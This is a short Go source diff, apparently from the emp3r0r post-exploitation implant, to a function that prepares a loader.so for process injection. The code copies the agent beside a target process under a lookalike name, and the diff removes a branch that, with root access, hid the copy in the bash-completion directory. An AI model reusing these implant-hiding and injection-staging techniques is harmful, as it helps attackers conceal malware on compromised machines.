@@ -108,6 +108,7 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 	}
 
 	// see loader/elf/loader.c
+	// make sure loader.so can find emp3r0r
 	exe_file := util.ProcExePath(pid)
 	if pid <= 0 && bin != "" {
 		exe_file = bin
@@ -118,10 +119,6 @@ func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 	agent_path := fmt.Sprintf("%s/_%s",
 		util.ProcCwd(pid),
 		util.FileBaseName(exe_file))
-	if HasRoot() {
-		agent_path = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
-			util.FileBaseName(exe_file))
-	}
 	err = CopySelfTo(agent_path)
 
 	return
